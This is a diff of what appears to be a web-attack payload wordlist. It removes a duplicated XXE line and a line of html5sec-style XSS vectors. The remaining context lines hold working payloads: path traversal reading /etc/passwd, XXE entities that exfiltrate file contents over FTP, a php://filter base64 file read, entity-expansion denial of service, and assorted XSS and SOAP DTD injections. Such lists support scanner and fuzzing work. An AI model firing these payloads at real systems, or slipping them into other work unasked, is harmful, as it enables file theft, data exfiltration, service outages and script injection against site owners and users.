@@ -20,7 +20,6 @@
 /rp?wsrp-url=file:///etc/passwd
 /wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
 <!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;
-<!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;
 <!entity % param3 "<!entity &#x25; exfil system 'ftp://127.0.0.1:21/%data3;'>">
 <!entity % xxe system "php://filter/convert.base64-encode/resource=/etc/passwd" >
 <!entity ha1 "&ha0;&ha0;" >
@@ -106,7 +105,6 @@
 <?xml-stylesheet type="text/css"?><!doctype x system "test.dtd"><x>&x;</x>
 <a href="file:///applications/calculator.app"><svg onload="this.parentnose.click()"></a>
 <div id="64"><!doctype x[<!entity x system "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>
-<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">x</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!doctype x system "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onload" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
 <link rel=attachment href="file:///etc/passwd">
 <meta http-equiv="refresh" content="1; url=file:////net/xss.cx/xss.html">
 <soap:body><foo><![cdata[<!doctype doc [<!entity % dtd system "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:body>
